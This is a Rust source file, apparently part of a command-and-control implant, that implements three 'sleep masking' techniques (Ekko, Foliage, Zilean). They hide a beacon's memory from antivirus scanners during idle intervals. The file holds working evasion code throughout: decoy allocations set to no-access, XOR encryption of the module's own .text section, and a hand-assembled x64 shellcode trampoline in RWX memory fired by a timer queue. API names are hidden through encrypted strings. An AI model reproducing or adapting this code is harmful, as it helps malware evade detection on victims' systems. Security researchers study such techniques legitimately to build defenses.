//! Sleep masking — multiple implementations that hide beacon memory from
//! AV scanners during the idle sleep interval.
//!
//! Ekko    — VirtualAlloc decoy region + VirtualProtect PAGE_NOACCESS.
//! Foliage — Encrypt self via ROP chain + timer queue to restore.
//! Zilean  — Foliage variant with Ekko-style decoy staggering.

use oxide_common::types::SleepObf;

pub async fn obfuscated_sleep(ms: u64, mode: &SleepObf) {
    match mode {
        SleepObf::None => {
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Ekko => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { ekko(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Foliage => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { foliage(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Zilean => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { zilean(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
    }
}

// ── Ekko ─────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn ekko(ms: u64) {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, VirtualProtect,
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_NOACCESS, PAGE_READWRITE,
    };

    // Allocate decoy region to confuse memory scanners
    let decoy_size = 0x1000usize;
    let decoy = VirtualAlloc(
        std::ptr::null(), decoy_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if !decoy.is_null() {
        let s = std::slice::from_raw_parts_mut(decoy as *mut u8, decoy_size);
        for (i, b) in s.iter_mut().enumerate() { *b = (i ^ 0xC3) as u8; }
    }

    let mut old = 0u32;
    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_NOACCESS, &mut old);
    }

    nt_sleep(ms);

    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_READWRITE, &mut old);
        VirtualFree(decoy, 0, MEM_RELEASE);
    }
}

// ── Foliage ───────────────────────────────────────────────────────────────────
//
// XOR-encrypts the .text section during sleep so memory scanners see garbage.
// A hand-written x64 shellcode trampoline in an RWX allocation (outside .text)
// is used as the CreateTimerQueueTimer callback: it re-enables .text, XOR-
// decrypts, restores the original page protection, then signals the event that
// unblocks the main thread. Because the trampoline lives outside .text, it can
// still run while .text is PAGE_NOACCESS / encrypted.
//
// Context struct layout (at RWX region byte 0):
//   +0:  text_ptr   (*mut u8)   – start of .text
//   +8:  text_size  (usize)     – byte length of .text
//   +16: key        ([u8;16])   – per-sleep XOR key
//   +32: old_prot   (u32)       – original .text page protection to restore
//   +36: _pad       (u32)
//   +40: h_event    (isize)     – HANDLE of manual-reset event
//   +48: pfn_vp     (u64)       – VirtualProtect fn ptr
//   +56: pfn_se     (u64)       – SetEvent fn ptr
// Shellcode starts at byte 64 of the RWX region.

#[cfg(target_os = "windows")]
unsafe fn foliage(ms: u64) {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, VirtualProtect,
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_EXECUTE_READWRITE, PAGE_NOACCESS,
    };
    use windows_sys::Win32::System::Threading::{
        CreateEventA, CreateTimerQueueTimer, DeleteTimerQueueTimer, WaitForSingleObject,
    };
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    // Locate .text
    let base = get_image_base();
    if base.is_null() { return ekko(ms); }
    let (text, text_size) = get_text_section(base);
    if text.is_null() || text_size == 0 { return ekko(ms); }

    // Allocate RWX region: 64 bytes context + 128 bytes shellcode
    let rgn = VirtualAlloc(
        std::ptr::null(), 256,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    );
    if rgn.is_null() { return ekko(ms); }

    // Resolve VirtualProtect and SetEvent through encrypted names
    let k32h = {
        let n = { let mut v = oxide_macros::encrypt_str!("kernel32.dll").into_bytes(); v.push(0); v };
        GetModuleHandleA(n.as_ptr() as _)
    };
    if k32h == 0 { VirtualFree(rgn, 0, MEM_RELEASE); return ekko(ms); }

    let pfn_vp: u64 = {
        let n = { let mut v = oxide_macros::encrypt_str!("VirtualProtect").into_bytes(); v.push(0); v };
        match GetProcAddress(k32h, n.as_ptr() as _) {
            Some(f) => std::mem::transmute::<_, u64>(f),
            None    => { VirtualFree(rgn, 0, MEM_RELEASE); return ekko(ms); }
        }
    };
    let pfn_se: u64 = {
        let n = { let mut v = oxide_macros::encrypt_str!("SetEvent").into_bytes(); v.push(0); v };
        match GetProcAddress(k32h, n.as_ptr() as _) {
            Some(f) => std::mem::transmute::<_, u64>(f),
            None    => { VirtualFree(rgn, 0, MEM_RELEASE); return ekko(ms); }
        }
    };

    // Create sync event (auto-reset, initially unsignaled)
    let h_event = CreateEventA(std::ptr::null(), 0, 0, std::ptr::null());
    if h_event == 0 { VirtualFree(rgn, 0, MEM_RELEASE); return ekko(ms); }

    let key = derive_foliage_key();

    // VirtualProtect .text -> RWX so we can XOR-encrypt it
    let mut saved = 0u32;
    if VirtualProtect(text as _, text_size, PAGE_EXECUTE_READWRITE, &mut saved) == 0 {
        CloseHandle(h_event);
        VirtualFree(rgn, 0, MEM_RELEASE);
        return ekko(ms);
    }

    // Build context in RWX region
    let ctx = rgn as *mut u8;
    (ctx.add( 0) as *mut u64).write(text as u64);
    (ctx.add( 8) as *mut u64).write(text_size as u64);
    std::ptr::copy_nonoverlapping(key.as_ptr(), ctx.add(16), 16);
    (ctx.add(32) as *mut u32).write(saved);
    (ctx.add(36) as *mut u32).write(0);
    (ctx.add(40) as *mut u64).write(h_event as u64);
    (ctx.add(48) as *mut u64).write(pfn_vp);
    (ctx.add(56) as *mut u64).write(pfn_se);

    // x64 shellcode trampoline (107 bytes).
    // Calling convention: rcx = &ctx (WAITORTIMERCALLBACK, rdx ignored).
    // 1. VirtualProtect(text_ptr, text_size, PAGE_EXECUTE_READWRITE, &tmp)
    // 2. XOR-decrypt .text with key (key_len=16, uses AND 0xF for fast modulo)
    // 3. VirtualProtect(text_ptr, text_size, old_prot, &tmp)
    // 4. SetEvent(h_event)
    static SC: &[u8] = &[
        // prologue: push non-volatile regs, sub rsp,0x38 (align+shadow space), save ctx→rbx
        0x55,0x53,0x56,0x57,0x48,0x83,0xEC,0x38,0x48,0x89,0xCB,
        // VirtualProtect(text_ptr, text_size, 0x40=PAGE_EXECUTE_READWRITE, &tmp)
        0x48,0x8B,0x0B,                   // mov rcx,[rbx+0]
        0x48,0x8B,0x53,0x08,              // mov rdx,[rbx+8]
        0x41,0xB8,0x40,0x00,0x00,0x00,    // mov r8d,0x40
        0x4C,0x8D,0x4C,0x24,0x20,         // lea r9,[rsp+0x20]
        0xFF,0x53,0x30,                   // call [rbx+0x30]  pfn_vp
        // XOR-decrypt .text
        0x48,0x8B,0x33,                   // mov rsi,[rbx+0]    text_ptr
        0x48,0x8B,0x7B,0x08,              // mov rdi,[rbx+8]    text_size
        0x4C,0x8D,0x43,0x10,              // lea r8,[rbx+0x10]  key ptr
        0x4D,0x31,0xD2,                   // xor r10,r10         i=0
        0x4C,0x3B,0xD7,                   // cmp r10,rdi
        0x7D,0x15,                        // jge +21 (xor_done)
        0x4C,0x89,0xD0,                   // mov rax,r10
        0x48,0x83,0xE0,0x0F,              // and rax,0xF        i%16
        0x41,0x0F,0xB6,0x04,0x00,         // movzx eax,byte[r8+rax]
        0x42,0x30,0x04,0x16,              // xor byte[rsi+r10],al
        0x49,0xFF,0xC2,                   // inc r10
        0xEB,0xE6,                        // jmp -26 (loop)
        // VirtualProtect(text_ptr, text_size, old_prot, &tmp)
        0x48,0x8B,0x0B,                   // mov rcx,[rbx+0]
        0x48,0x8B,0x53,0x08,              // mov rdx,[rbx+8]
        0x44,0x8B,0x43,0x20,              // mov r8d,[rbx+0x20]  old_prot
        0x4C,0x8D,0x4C,0x24,0x20,         // lea r9,[rsp+0x20]
        0xFF,0x53,0x30,                   // call [rbx+0x30]
        // SetEvent(h_event)
        0x48,0x8B,0x4B,0x28,              // mov rcx,[rbx+0x28]  h_event
        0xFF,0x53,0x38,                   // call [rbx+0x38]  pfn_se
        // epilogue
        0x48,0x83,0xC4,0x38,0x5F,0x5E,0x5B,0x5D,0xC3,
    ];
    std::ptr::copy_nonoverlapping(SC.as_ptr(), ctx.add(64), SC.len());

    // XOR-encrypt .text (runs from .text while still RWX — scope ends before PAGE_NOACCESS)
    {
        let s = std::slice::from_raw_parts_mut(text as *mut u8, text_size);
        for (i, b) in s.iter_mut().enumerate() { *b ^= key[i & 15]; }
    }

    // Hide encrypted .text from memory scanners
    let mut dummy = 0u32;
    VirtualProtect(text as _, text_size, PAGE_NOACCESS, &mut dummy);

    // Fire the shellcode after `ms` ms via timer queue; it restores .text and signals h_event
    let sc_fn: unsafe extern "system" fn(*mut std::ffi::c_void, u8) =
        std::mem::transmute(ctx.add(64));
    let mut h_timer: isize = 0;
    let ok = CreateTimerQueueTimer(
        &mut h_timer,
        0,            // default queue
        Some(sc_fn),
        ctx as *mut _,
        ms as u32,
        0,            // one-shot
        0,            // WT_EXECUTEDEFAULT
    );

    if ok != 0 {
        // Block until callback decrypts .text and signals the event
        WaitForSingleObject(h_event, 0xFFFF_FFFFu32);
        DeleteTimerQueueTimer(0, h_timer, 0);
    } else {
        // Timer creation failed — manually restore .text then fall back
        let mut tmp = 0u32;
        VirtualProtect(text as _, text_size, PAGE_EXECUTE_READWRITE, &mut tmp);
        let s = std::slice::from_raw_parts_mut(text as *mut u8, text_size);
        for (i, b) in s.iter_mut().enumerate() { *b ^= key[i & 15]; }
        VirtualProtect(text as _, text_size, saved, &mut tmp);
    }

    CloseHandle(h_event);
    VirtualFree(rgn, 0, MEM_RELEASE);
}

// ── Zilean (Foliage + Ekko stagger) ──────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn zilean(ms: u64) {
    // Stagger: ekko decoy for first half, foliage encrypt for second half
    ekko(ms / 2);
    foliage(ms / 2);
}

// ── helpers ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn nt_sleep(ms: u64) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Threading::Sleep;

    let interval: i64 = -((ms as i64) * 10_000);
    let ntdll_n = { let mut v = oxide_macros::encrypt_str!("ntdll.dll").into_bytes(); v.push(0); v };
    let ntdll = GetModuleHandleA(ntdll_n.as_ptr() as _);
    if ntdll != 0 {
        let fn_n = { let mut v = oxide_macros::encrypt_str!("NtDelayExecution").into_bytes(); v.push(0); v };
        if let Some(f) = GetProcAddress(ntdll, fn_n.as_ptr() as _) {
            type Fn = unsafe extern "system" fn(i32, *const i64) -> i32;
            let nt: Fn = std::mem::transmute(f);
            nt(0, &interval);
            return;
        }
    }
    Sleep(ms as u32);
}

#[cfg(target_os = "windows")]
unsafe fn get_image_base() -> *const u8 {
    // Walk the PEB to find this module's ImageBase
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    // Simple: use the address of this function and walk back to MZ header
    let mut addr = get_image_base as *const () as usize;
    addr &= !0xFFF; // page align
    for _ in 0..0x200 {
        if *(addr as *const u16) == 0x5A4D { // MZ
            return addr as *const u8;
        }
        if addr < 0x1000 { break; }
        addr -= 0x1000;
    }
    std::ptr::null()
}

#[cfg(target_os = "windows")]
unsafe fn get_text_section(base: *const u8) -> (*const u8, usize) {
    if base.is_null() { return (std::ptr::null(), 0); }
    let dos = base as *const u8;
    if *(dos.add(0) as *const u16) != 0x5A4D { return (std::ptr::null(), 0); }
    let e_lfanew = *(dos.add(0x3C) as *const u32) as usize;
    let nt = dos.add(e_lfanew);
    let num_sects = *(nt.add(6) as *const u16) as usize;
    let opt_size  = *(nt.add(0x14) as *const u16) as usize;
    let sect_base = nt.add(0x18 + opt_size);
    for i in 0..num_sects {
        let s = sect_base.add(i * 0x28);
        let name = std::slice::from_raw_parts(s, 8);
        if &name[..5] == b".text" {
            let va  = *(s.add(0x0C) as *const u32) as usize;
            let sz  = *(s.add(0x10) as *const u32) as usize;
            return (dos.add(va), sz);
        }
    }
    (std::ptr::null(), 0)
}

#[cfg(target_os = "windows")]
fn derive_foliage_key() -> [u8; 16] {
    // Deterministic per-process key: mix PID + time
    use std::time::{SystemTime, UNIX_EPOCH};
    let pid = std::process::id() as u64;
    let ts  = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0);
    let seed = pid.wrapping_mul(0x9e3779b9).wrapping_add(ts);
    let mut k = [0u8; 16];
    for (i, b) in k.iter_mut().enumerate() {
        let v = seed.wrapping_mul(6364136223846793005u64.wrapping_add(i as u64))
                    .wrapping_add(1442695040888963407);
        *b = (v >> 32) as u8;
    }
    k
}
